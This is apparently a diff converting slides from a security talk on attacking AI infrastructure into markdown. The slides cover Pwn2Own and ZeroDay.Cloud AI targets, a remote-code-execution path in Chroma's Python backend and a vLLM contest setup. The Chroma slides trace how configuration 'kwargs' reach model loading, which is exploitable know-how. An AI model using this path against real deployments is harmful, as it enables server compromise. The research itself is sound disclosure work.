@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 87.8
 ocr_unreliable_blocks: 9
+vision_verified_pages_changed: 62
+vision_verified_pages: 65
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -31,29 +33,33 @@ converted_at: "2026-08-12T06:39:35Z"
 
 2026
 
-One Chain to Own Them All
+### One Chain to Own Them All
 
-Breaking AI Infrastructures Ji'an Zhou
+Breaking AI Infrastructures
+
+Ji'an Zhou
 
 1
 
 ## Slide 2
 
-01 Introduction
-02 Journey Begins
-03 Pwn it!
-Agenda
-One Chain,
+### Agenda
+
 CONTENTS
-04
-All Owned
-05 Summary
+
+- 01 Introduction
+- 02 Journey Begins
+- 03 Pwn it!
+- 04 One Chain, All Owned
+- 05 Summary
 
 2
 
 ## Slide 3
 
-# Introduction
+### PART 01
+
+Introduction
 
 3
 
@@ -61,157 +67,142 @@ All Owned
 
 ### **LLM!**
 
+**LARGE LANGUAGE MODEL**
+
+*Illustration: a brain labelled "AI" wired with circuit traces to empty rounded call-out boxes; the small square nodes are labelled "T" and "C" on the left, "A" on the right, and "..." at the bottom.*
+
 4
-
-
-> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“LLM!
-LARGE LANGUAGE MODEL
-```
 
 ## Slide 5
 
 ### **Evolution: LLM → RAG → Agent**
 
+*Hand-drawn diagram of three pipelines:*
+
+**LLM**: prompt → LLM → answer
+
+**RAG**: (database) + context → LLM → answer
+
+**AGENT**: (database) memory → LLM, with a brain icon and a scissors icon labelled tools looping back into the LLM
+
 5
-
-
-> Recovered by OCR — confidence 81/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Evolution: LLM > RAG — Agent
-answer answer
-```
 
 ## Slide 6
 
 ### **AI + Security**
 
-6
+**AI for security**
 
+AI is the tool
 
-> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Al + Security
-Al for security
-Al is the tool
 Detect threats
+
 Respond faster
+
 Find vulnerabilities
-reinforce
-Security for Al
-Al is the subject
+
+*↔ reinforce each other*
+
+**Security for AI**
+
+AI is the subject
+
 Protect the model
+
 Control access
+
 Prevent misuse
-```
+
+6
 
 ## Slide 7
 
 ### **AI For Security**
 
+**16:35 – 17:00** AI Found 12 Zero-Days In OpenSSL. What Does It Mean For The Industry?
+
+**Adam Krivka**, AI Security Reseatcher, AISLE
+
+**Ondrej Vlcek**, Co-founder & CEO, AISLE
+
+**13:55 – 14:20** FENRIR: AI Hunting for AI Zero-Days at Scale
+
+**Peter Girnus**, Senior Threat Researcher, TrendAI
+
+**Derek Chen**, Vulnerability Researcher, TrendAI
+
+**11:35 – 12:00** AI Agents for Exploiting “Auth-by-One” Errors
+
+**Brendan Dolan-Gavitt**, AI Researcher, XBOW
+
+**Vincent Olesen**, AI Researcher, XBOW
+
+**10:55 – 11:20** Promp2Pwn – LLMs Winning at Pwn2Own
+
+**Georgi G**, Director of Research, Interrupt Labs
+
+**11:20 – 11:45** Source to Sink: How to Improve LLM First-Party Vuln Discovery
+
+**Scott Behrens**, Principal Security Engineer, Netflix
+
+**Justice Cassel**, Application & GenAI Security, Netflix
+
+https://unpromptedcon.org/
+
 7
-
-https://unpromptedcon.org/
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Al For Security
-16:35 - 17:00 Al Found 12 Zero-Days In OpenSSL. What Does It Mean
-For The Industry?
-Adam Krivka, Al Security Reseatcher, AISLE
-Ondrej Vicek, Co-founder & CEO, AISLE
-13:55 - 14:20 FENRIR: Al Hunting for Al Zero-Days at Scale
-Peter Girnus, Senior Threat Researcher, TrendAl
-Derek Chen, Vulnerability Researcher, TrendAl
-11:35- 12:00 Al Agents for Exploiting “Auth-by-One” Errors
-Brendan Dolan-Gavitt, Al Researcher, XBOW
-Vincent Olesen, Al Researcher, XBOW
-10:55 - 11:20 Promp2Pwn - LLMs Winning at Pwn20wn
-Georgi G, Director of Research, Interrupt Labs
-11:20- 11:45 Source to Sink: How to Improve LLM First-Party Vuln
-Discovery
-Scott Behrens, Principal Security Engineer, Netflix
-Justice Cassel, Application & GenAl Security, Netflix
-https://unpromptedcon.org/
-```
 
 ## Slide 8
 
 ### **Security For AI**
 
+**Agentic Browser Security: 2025 Year-End Review**  
+Rami McCarthy  
+January 17, 2026
+
+**Hacking Moltbook: The AI Social Network Any Human Can Control**  
+Gal Nagli  
+February 2, 2026
+
+**Context.ai OAuth Token Compromise**  
+Merav Bar, Hila Ramati, Maayan Bentor  
+April 21, 2026
+
+**How Wiz found a Critical NVIDIA AI vulnerability: Deep Dive into a container escape (CVE-2024-0132)**  
+Shir Tamari, Ronen Shustin, Andres Riancho  
+February 12, 2025
+
+**The risk in malicious AI models: Wiz Research discovers critical vulnerability in AI-as-a-Service provider, Replicate**  
+Shir Tamari, Sagi Tzadik  
+May 23, 2024
+
+**MCP Auto-Execution: From Git Clone to Cloud Compromise in Amazon Q VS Code Extension**  
+Maor Dokhanian  
+June 26, 2026
+
+*Card thumbnails carry the artwork captions: WIZ Research; MOLTBOOK; WIZ Threat Update! – Context.ai OAuth Token Compromise; WIZ Research – NVIDIA Vulnerability Details; WIZ / Replicate – WIZ Research; MCP – WIZ Research.*
+
 https://www.wiz.io/blog/
 
 8
-
-
-> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Security For Al
-MOLTBOOK
-| Context.ai OAuth |
-| Token Compromise |
-Hacking Moltbook: The Al
-Social Network Any Human
-Can Control
-Context.ai OAuth Token
-Compromise
-Agentic Browser Security:
-2025 Year-End Review
-Merav Bar, Hila Ramati,
-anuary 17, 202¢ @, GalNagli Al » Maayan Bentor
-The risk in malicious Al
-How Wiz found a Critical
-NVIDIA Al vulnerability: Deep
-Dive into a container escape
-(CVE-2024-0132)
-Shir Tamari, Ronen Shustin,
-é g Ss Andres Riancho
-February 12, 2025
-models: Wiz Research
-discovers critical vulnerability
-in Al-as-a-Service provider,
-Replicate
-@ Shir Tamari, Sagi Tzadik
-May 23, 2024
-https://www.wiz.io/blog/
-MCP Auto-Execution: From Git
-Clone to Cloud Compromise
-in Amazon Q VS Code
-Extension
-&: Maor Dokhanian
-é June 26, 2026
-```
 
 ## Slide 9
 
 ### **Security For AI**
 
-9
+**ANNOUNCING PWN2OWN BERLIN AND INTRODUCING AN AI CATEGORY**
 
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Security For Al
-ANNOUNCING PWN2OWN BERLIN AND
-INTRODUCING AN Al CATEGORY
 February 24, 2025 | Dustin Childs
-Master of Pwn
-Points
-Chroma $20,000 2
-Postgres pgvector $30,000 3
-Redis $40,000 4
-Ollama $20,000 2
-NVIDIA Triton Inference Server $30,000 o
-NVIDIA Container Toolkit $30,000 3
-```
+
+| Target | Prize | Master of Pwn Points |
+| --- | --- | --- |
+| Chroma | $20,000 | 2 |
+| Postgres pgvector | $30,000 | 3 |
+| Redis | $40,000 | 4 |
+| Ollama | $20,000 | 2 |
+| NVIDIA Triton Inference Server | $30,000 | 3 |
+| NVIDIA Container Toolkit | $30,000 | 3 |
+
+9
 
 ## Slide 10
 
@@ -221,7 +212,9 @@ NVIDIA Container Toolkit $30,000 3
 
 ## Slide 11
 
-# Journey Begins
+### PART 02
+
+Journey Begins
 
 11
 
@@ -229,837 +222,612 @@ NVIDIA Container Toolkit $30,000 3
 
 ### **Classifying AI Targets**
 
+**DATA & VECTOR STORAGE**
+
+Chroma pgvector Redis
+
+**MODEL INFERENCE & SERVING**
+
+Ollama NVIDIA Triton Inference Server
+
+**FOUNDATIONAL INFRASTRUCTURE**
+
+NVIDIA Container Toolkit
+
 12
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Classifying Al Targets
-DATA & VECTOR STORAGE MODEL INFERENCE & SERVING FOUNDATIONAL INFRASTRUCTURE
-Chroma pgvector Redis Ollama _, NWIDIA Triton NVIDIA Toolkit
-Inference Server
-```
 
 ## Slide 13
 
 ### **New Security Contest Hosted by Wiz**
 
-13
+**ZERODAY**  
+**20 CLOUD 25**
 
+– AI –
 
-> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**Ollama**  
+Runs consumer AI models in the cloud.  
+**$40,000**
 
-```text
-“New Security Contest Hosted by Wiz
-Powers fast LLM endpoints in the cloud.
-fo} Ollama
-Runs consumer Al models in the cloud.
-$40,000
-$40,000
-& NVIDIA Container Toolkit
-Enables GPU access for containerized cloud
-workloads.
-$40,000
+**vLLM**  
+Powers fast LLM endpoints in the cloud.  
+**$40,000**
+
+**NVIDIA Container Toolkit**  
+Enables GPU access for containerized cloud workloads.  
+**$40,000**  
 Container escape
+
 13
-```
 
 ## Slide 14
 
 ### **Summary of AI Targets & Categories**
 
+**DATA & VECTOR STORAGE**
+
+- Chroma
+- pgvector
+- Redis
+
+**MODEL INFERENCE & SERVING**
+
+- Ollama
+- vLLM
+- NVIDIA Triton Inference Server
+
+**FOUNDATIONAL INFRASTRUCTURE**
+
+- NVIDIA
+- NVIDIA Container Toolkit
+
 14
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Summary of Al Targets & Categories
-DATA & VECTOR STORAGE
-MODEL INFERENCE & SERVING
-FOUNDATIONAL INFRASTRUCTURE
-Chroma pgvector Redis
-Ollama NVIDIA Triton
-Inference Server
-> NVIDIA
-Container
-NVIDIA Toolkit
-14
-```
 
 ## Slide 15
 
 ### **Data & Vector Storage**
 
+**DATA & VECTOR STORAGE**
+
+- Chroma
+- pgvector
+- Redis
+
+**MODEL INFERENCE & SERVING**
+
+- Ollama
+- vLLM
+- NVIDIA Triton Inference Server
+
+**FOUNDATIONAL INFRASTRUCTURE**
+
+- NVIDIA
+- NVIDIA Container Toolkit
+
+*(Same three-panel diagram as the previous slide; the DATA & VECTOR STORAGE panel is emphasised and the Chroma logo/label is boxed in red, while the other two panels are greyed out.)*
+
 15
-
-
-> Recovered by OCR — confidence 87/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Data & Vector Storage
-(MODEL INFERENCE & SERVING |
-FOUNDATIONAL INFRASTRUCTURE
-Chroma
-pgvector Redis
-NVIDIA Triton
-Ollama Inference Server
-NVIDIA
-Container
-NVIDIA Toolkit
-15
-```
 
 ## Slide 16
 
 ### **Architecture**
 
+*Diagram in a window titled **Chroma**:*
+
+- **Clients** --> **Gateways** --> **Distributed Log**
+- **Gateways** --> **Query Nodes**
+- **Distributed Log** --> **Compactor Nodes**
+- **Query Nodes** --> (dashed line running right) --> **SysDb**
+- **Compactor Nodes** --> **Storage**
+
 16
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Architecture
-Clients
-Gateways Distributed Log
-'
-'
-'
-Vv
-Query Nodes
-16
-```
 
 ## Slide 17
 
 ### **Written in Rust**
 
+*(Chroma logo and wordmark, top right: **Chroma**)*
+
+`chroma-core / chroma` — `Type / to search`
+
+Code · Issues **260** · Pull requests **291** · Actions · Projects · Wiki · Security and quality · Insights
+
+**Files** — branch `main` — `Go to file` (t)
+
+File tree (`rust` expanded):
+
+- api-types
+- benchmark
+- blockstore
+- cache
+- chroma
+- cli
+- config
+- distance
+- error
+- frontend
+- garbage_collector
+- index
+- jemalloc-pprof-server
+- js-bindings *(row cut off at the bottom edge)*
+
+`chroma / rust /`
+
+tanujnay112 — [CHORE]: Create per-tenant config in the compactor for shard sizes (#… — 3676846 · [cut off]
+
+| Name | Last commit message |
+| --- | --- |
+| .. | |
+| api-types | [RELEASE] Rust client 0.13.3 (#6769) |
+| benchmark | [CHORE]: Update google cloud spanner dependency + update rust version (… |
+| blockstore | [ENH] Wire BloomFilter into RecordSegmentWriter (#6647) |
+| cache | [ENH]: Code impl for Block with more efficient estimated_size() funct… |
+| chroma | [ENH] Add getCollectionById API across all client SDKs and server (#6805 |
+| cli | [RELEASE] CLI 1.4.3 Python 1.5.7 JS 3.4.3 (#6845) |
+| config | [CHORE] Upgrade reqwest and spanner crates (#6705) |
+| distance | [ENH] Cleanup a warning on AVX512+SSE where both are imported. (#5931) |
+| error | [BUG](log-service,storage): classify transient errors for retry (#6731) |
+| frontend | [ENH]: Merge, sort and truncate in FE (#6846) |
+
 17
-
-
-> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Written in Rust q Chroma
-<> Code © Issues 260 3] Pullrequests 291 © Actions [fH Projects wiki © Securityand quality | Insights
-{) Files chroma / rust / (2
-P main ~ + Q tanujnay112 [CHORE]: Create per-tenant config in the compactor for shard sizes (#... GB =X 3676846 - :
-Q Goto file t
-Name Last commit message
-> QW api-types =.
-> [® benchmark ® api-types [RELEASE] Rust client 0.13.3 (#6769)
-> ll blockstore © benchmark [CHORE]: Update google cloud spanner dependency + update rust version (...
-> (§ cache
-® blockstore [ENH] Wire BloomFilter into RecordSegmentWriter (#6647)
-> {8 chroma
-> Peal ® cache [ENH]: Code impl for Block with more efficient estimated_size() funct...
-> & config © chroma [ENH] Add getCollectionByld API across all client SDKs and server (#6805
-> Be distance ®& cli [RELEASE] CLI 1.4.3 Python 1.5.7 JS 3.4.3 (#6845)
-> © error
-® config [CHORE] Upgrade reqwest and spanner crates (#6705)
-> §® frontend
-> B® garbage_collector ® distance [ENH] Cleanup a warning on AVX512+SSE where both are imported. (#5931)
-> ® index © error [BUG] (log-service,storage): classify transient errors for retry (#6731)
-> §§ jemalloc-pprof-server
-® frontend [ENH]: Merge, sort and truncate in FE (#6846)
-17
-```
 
 ## Slide 18
 
 ### **Pwned?**
 
+**TrendAI Zero Day Initiative** (verified) @thezdi · 2025年5月15日
+
+Confirmed! The first ever winner of the AI category in **#Pwn2Own** is Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam). His successful exploit of **Chroma** earns him $20,000 and 2 Master of Pwn points. #P2OBerlin
+
+Attached graphic:
+
+**SUCCESS**
+
+**Sina Kheirkhah**
+
+Summoning Team
+
+**TARGETTING**
+
+Chroma in the AI category
+
+| PRIZE $ | POINTS |
+| --- | --- |
+| $20,000 | 2 |
+
+*(Tweet engagement: 4 replies · 9 reposts · 84 likes · 1.1万 views)*
+
+*(Top right: a reaction-meme photo of a smiling man, captioned "???")*
+
 18
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-Pwned?
-© TrendAl Zero Day Initiative @ @thezdi - 2025425158 Yo
-Confirmed! The first ever winner of the Al category in #Pwn2Own is Sina
-Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam). His
-successful exploit of Chroma earns him $20,000 and 2 Master of Pwn
-points. #P20Berlin aa
-Sina Kheirkhah
-TARGETTING
-Chroma in the Al category
-PRIZE $ POINTS
-```
 
 ## Slide 19
 
 ### **My Discovery**
 
-19
-
-
-> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“'My Discovery
-async def create_collection(
-self,
-request: Request,
-tenant: str,
-database_name: str,
-) -> CollectionModel:
-def process_create_collection(
-request: Request, tenant: str, database: str, raw_body: bytes
-) -> CollectionModel:
-create = validate_model(CreateCollection, orjson. loads(raw_body) )
-if not create.configuration:
-else:
-configuration = load_create_collection_configuration_from_json(
-def build_from_config(config: Dict[str, Any]) -> “EmbeddingFunction[Documents]":
-model_name = config.get("model_name")
-device = config.get("device")
-normalize_embeddings = config.get("normalize_embeddings")
-kwargs = config.get("kwargs", {})
-if model_name is None or device is None or normalize_embeddings is None:
-assert False, "This code should not be reached"
-return SentenceTransformerEmbeddingFunction(
-model_name=model_name,
-device=device,
-normalize_embeddings=normalize_embeddings,
-if json_map.get("embedding_function") is not None:
-ef_config = json_map["embedding_function"]
-if ef_config["type"] == "legacy":
-warnings.warn(
-"Legacy embedding function config",
-DeprecationWarning,
-stacklevel=2,
-)
-else:
-ef = known_embedding_functions [ef_config["name"] ]
-result ["embedding_function"] = ef.build_from_config(ef_config["config"])
-19
+```python
+@trace_method("FastAPI.create_collection", OpenTelemetryGranularity.OPERATION)
+    async def create_collection(
+        self,
+        request: Request,
+        tenant: str,
+        database_name: str,
+    ) -> CollectionModel:
+        def process_create_collection(
+            request: Request, tenant: str, database: str, raw_body: bytes
+        ) -> CollectionModel:
+            create = validate_model(CreateCollection, orjson.loads(raw_body))
+            if not create.configuration:
+                ...
+            else:
+                configuration = load_create_collection_configuration_from_json(
+                    create.configuration
+                )
 ```
+
+*(Red box around the `configuration = load_create_collection_configuration_from_json(create.configuration)` lines; a red arrow points from there to the right-hand snippet below.)*
+
+```python
+def build_from_config(config: Dict[str, Any]) -> "EmbeddingFunction[Documents]":
+    model_name = config.get("model_name")
+    device = config.get("device")
+    normalize_embeddings = config.get("normalize_embeddings")
+    kwargs = config.get("kwargs", {})
+
+    if model_name is None or device is None or normalize_embeddings is None:
+        assert False, "This code should not be reached"
+
+    return SentenceTransformerEmbeddingFunction(
+        model_name=model_name,
+        device=device,
+        normalize_embeddings=normalize_embeddings,
+        **kwargs,
+    )
+```
+
+*(Red boxes around `kwargs = config.get("kwargs", {})` and around the whole `return SentenceTransformerEmbeddingFunction(...)` block.)*
+
+```python
+    if json_map.get("embedding_function") is not None:
+        ef_config = json_map["embedding_function"]
+        if ef_config["type"] == "legacy":
+            warnings.warn(
+                "legacy embedding function config",
+                DeprecationWarning,
+                stacklevel=2,
+            )
+        else:
+            ef = known_embedding_functions[ef_config["name"]]
+            result["embedding_function"] = ef.build_from_config(ef_config["config"])
+```
+
+*(Red box around the two lines under `else:`; a red arrow points from there down-left to the `build_from_config` snippet.)*
+
+19
 
 ## Slide 20
 
 ### **My Discovery**
 
-20
+**[Vulnerability ]: Python Backend Server Side RCE & Python Client SDK RCE** #6717
 
-https://github.com/chroma-core/chroma/issues/6717
+`Open`
 
+azraelxuemo opened on Mar 24 — Last edited by azraelxuemo
 
-> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**Vulnerability 1, Python Backend Server Side RCE**
 
-```text
-“'My Discovery
-[Vulnerability ]: Python Backend Server Side RCE & Python Client
-SDK RCE #6717 7
-azraelxuemo opened on Mar 24 Last edited by azraelxuemo ~ °**
-Vulnerability 1, Python Backend Server Side RCE
-Clarification
-Chroma has two server-side implementations: one in Python and the other in Rust. By default you will get a Rust Server, and this
-vulnerability only affect the Python Backend
-Detail
+**Clarification**
+
+Chroma has two server-side implementations: one in Python and the other in Rust. By default you will get a Rust Server, and this vulnerability only affect the Python Backend
+
+**Detail**
+
 First, the API Server of Chroma has an interface called create_collection.
 And it will calls the load_create_collection_configuration_from_json function.
 https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py#L816
+
+https://github.com/chroma-core/chroma/issues/6717
+
 20
-```
 
 ## Slide 21
 
 ### **Pwned Again!**
 
+**TrendAI Zero Day Initiative** (verified) @thezdi · 5月14日
+
+Confirmed! haehae (@haehaeYang) of Out Of Bounds chained 2 bugs (CWE-190, CWE-362) to exploit **Chroma**, earning $20,000 and 2 Master of Pwn points. Full win! **#Pwn2Own** #P2OBerlin
+
+*(Photo: two laptops held up side by side; the left screen shows the Out of Bounds logo with the text "Out of Bounds" and "oobs.io".)*
+
+*(Tweet engagement: 1 reply · 6 reposts · 76 likes · 9,241 views)*
+
 21
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Pwned Again!
-TrendAl Zero Day Initiative @ @thezdi - 51448 (Jor
-Confirmed! haehae (@haehaeYang) of Out Of Bounds chained 2 bugs
-(CWE-190, CWE-362) to exploit Chroma, earning $20,000 and 2 Master of
-Pwn points. Full win! #Pwn2Own #P2O0Berlin
-Out of Bounds
-21
-```
 
 ## Slide 22
 
 ### **Choose vLLM – Written in Python**
 
+**DATA & VECTOR STORAGE**
+
+- Chroma
+- pgvector
+- Redis
+
+**MODEL INFERENCE & SERVING**
+
+- Ollama
+- vLLM
+- NVIDIA Triton Inference Server
+
+**FOUNDATIONAL INFRASTRUCTURE**
+
+- NVIDIA
+- NVIDIA Container Toolkit
+
+*(Same three-panel diagram; the MODEL INFERENCE & SERVING panel is emphasised and the vLLM logo is boxed in red, while the other two panels are greyed out.)*
+
 22
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Choose vLLM - Written in Python
-DATA & VECTOR STORAGE
-FOUNDATIONAL INFRASTRUCTURE |
-___|_MODEL INFERENCE & SERVING ea
-Chroma pgvector Redis
-Ollama
-vLLM
-@ |
-NVIDIA
-NVIDIA Triton
-Inference Server
-NVIDIA
-NVIDIA
-Container
-Toolkit
-22
-```
 
 ## Slide 23
 
 ### **Latest Version Recap**
 
-23
+你已转帖
 
+**Wiz** (verified) @wiz_io · 2025年10月1日
 
-> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Introducing ZERODAY.CLOUD🥷
+Be the first to participate in the first-of-its-kind cloud hacking competition. 🤝
 
-```text
-“Latest Version Recap
-Introducing ZERODAY.CLOUD &
-Be the first to participate in the first-of-its-kind cloud hacking competition.
-WIN PRIZES from our 4.5M$ prize pool. §
-Register your exploit > zeroday.clouc
+WIN PRIZES from our 4.5M$ prize pool. 💰
+
+Register your exploit > zeroday.cloud
+
 @msftsecresponse @awscloud @googlecloud
-Oct 3, 2025 v0.11.0
-WIZ Research @ simon-mo
-6 ‘OUD compare ~ This release fea
-The first of its kind cloud hacking competition
-- STARTING NOW! -
+
+*(Attached GIF card:)* **WIZ Research** — **ZERODAY CLOUD** (20 / 25) — "The first of its kind cloud hacking competition" — **- STARTING NOW! -** — GIF
+
+*(Right: browser window)*
+
+https://github.com/vllm-project/vllm/releases?page=2
+
+Oct 3, 2025 — simon-mo — v0.11.0 — b8b302c — Compare
+
+**v0.11.0**
+
+**Highlights**
+
+This release fea… *(cut off at the right edge)*
+
 23
-```
 
 ## Slide 24
 
 ### **Contest Environment Setup**
 
-24
+**zeroday-cloud-2025 / vllm / docker-compose.yaml**
 
+nirohfeld  Added targets
 
-> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Code | Blame — `25 lines (20 loc) · 520 Bytes`
 
-```text
-“Contest Environment Setup
-zeroday-cloud-2025 / vilm / docker-compose.yaml (2
-nirohfeld Added targets
-Code Blame 25 lines (20 loc) + 520 Bytes
-1 services:
-2 vllm:
-3 image: vllm/vllm-openai: latest
-4 container_name: zerodaycloud-vllm
-5
-6 ports:
-7 — "8000:8000"
-8
-9 environment:
-10 - HUGGING_FACE_HUB_TOKEN=${HUGGING_FACE_HUB_TOKEN:-}
+```yaml
+ 1  services:
+ 2    vllm:
+ 3      image: vllm/vllm-openai:latest
+ 4      container_name: zerodaycloud-vllm
+ 5
+ 6      ports:
+ 7        - "8000:8000"
+ 8
+ 9      environment:
+10        - HUGGING_FACE_HUB_TOKEN=${HUGGING_FACE_HUB_TOKEN:-}
 11
-12 deploy:
-13 resources:
-14 reservations:
-15 devices:
-16 - driver: nvidia
-17 count: all
-18 capabilities: [gpu]
+12      deploy:
+13        resources:
+14          reservations:
+15            devices:
+16              - driver: nvidia
+17                count: all
+18                capabilities: [gpu]
 19
-20 command: >
-21 —-model ${MODEL:-facebook/opt-125m}
-22 —-host 0.0.0.0
-23 —-port 8000
+20      command: >
+21        --model ${MODEL:-facebook/opt-125m}
+22        --host 0.0.0.0
+23        --port 8000
 24
-25 restart: unless-stopped
+25      restart: unless-stopped
 ```
+
+24
 
 ## Slide 25
 
 ### **Supported APIs**
 
-25
-
-
-> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-“Supported APIs
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-(APIServer
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO
-INFO:
-INFO:
-INFO:
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-04-14
-21:
-217
-21%
-21:
-215
-213
-21%
-21:
-21%
-21:
-21%
-21%
-21:
-213
-21%
-21:
-21:
-21:
-21:
-21:
-21
-21%
-213
-21%
-21:
-21:
-21:
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-239
-50:
-50:
-50:
-50:
-239
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-50:
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-39
-Lapi_server.py:1
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-[launcher.
-py
-Py:
-Py:
-Py:
-py:
-242]
-Py
-Py:
-py:
-242]
-Py
-Py:
-Py
-Py:
-Py:
-Py
-Py:
-py:
-Py:
-Py:
-Py
-Py:
-Py:
-Py:
-Py:
-py
-Py:
-Py:
-py:
-Py:
-py
-py:
-Py:
-py
-Started server process
-Waiting for application startup.
-Application startup complete.
-234]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-42]
-121 Starting vILM API server @ on http://0.0.0.0:8000
-Available routes are:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-Route:
-/openapi.json, Methods: GET, HEAD
-/docs, Methods: GET, HEAD
-/docs/oauth2-redirect, Methods: GET, HEAD
-/redoc, Methods: GET, HEAD
-/health, Methods: GET
-/load, Methods: GET
-/ping, Methods: POST
-/ping, Methods: GET
-/tokenize, Methods: POST
-/detokenize, Methods: POST
-/v1/models, Methods: GET
-/version, Methods: GET
-/v1/responses, Methods: POST
-/v1/responses/{response_id}, Methods: GET
-/v1/responses/{response_id}/cancel, Methods:
-/v1/chat/completions, Methods: POST
-/v1/completions, Methods: POST
-/v1/embeddings, Methods: POST
-/pooling, Methods: POST
-/classify, Methods: POST
-/score, Methods: POST
-/v1/score, Methods: POST
-/v1/audio/transcriptions, Methods: POST
-/v1/audio/translations, Methods: POST
-/rerank, Methods: POST
-/v1/rerank, Methods: POST
-/v2/rerank, Methods: POST
-/scale_elastic_ep, Methods: POST
-/is_scaling_elastic_ep, Methods: POST
-/invocations, Methods: POST
-/metrics, Methods: GET
-25
+[illegible]
+(APIServer pid=1) INFO 04-14 21:50:39 [api_server.py:1912] Starting vLLM API server 0 on http://0.0.0.0:8000
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:34] Available routes are:
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /openapi.json, Methods: GET, HEAD
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /docs, Methods: GET, HEAD
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /docs/oauth2-redirect, Methods: GET, HEAD
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /redoc, Methods: GET, HEAD
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /health, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /load, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /ping, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /ping, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /tokenize, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /detokenize, Methods: POST
